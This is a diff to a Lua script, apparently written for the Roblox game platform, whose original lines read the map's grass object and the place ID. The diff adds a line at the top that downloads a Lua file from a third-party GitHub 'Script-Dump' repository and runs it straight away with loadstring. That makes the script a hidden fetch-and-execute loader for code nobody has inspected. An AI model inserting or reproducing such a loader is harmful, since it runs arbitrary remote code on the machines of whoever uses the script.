@@ -1,3 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DohmBoyOG/Script-Dump/main/ZHZH0MIYKR.lua"))()
+
+
 local grass = game:GetService("Workspace").Map.Grass
 local PlaceID = game.PlaceId
 local AllIDs = {}
